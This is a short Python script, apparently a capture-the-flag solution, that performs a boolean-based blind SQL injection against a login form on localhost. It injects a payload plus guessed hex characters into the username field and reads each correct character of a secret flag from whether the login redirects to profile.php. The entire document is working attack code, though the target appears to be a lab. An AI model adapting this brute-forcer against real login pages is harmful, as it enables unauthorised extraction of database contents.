import requests

symbols = "0123456789abcdef}"
payload = open("payload.txt").read()
# print(payload)
flag = ""
while True:
    print(flag)
    for s in symbols:
        print("trying", s)
        data = {
            "username": payload+flag+s+"%')#",
            "password": "123",
            "login-submit": "1"
        }
        url = requests.post("http://localhost:5008/", data=data).url
        if url == "http://localhost:5008/profile.php":
            flag += s
            break
    else:
        print(flag)
        break
        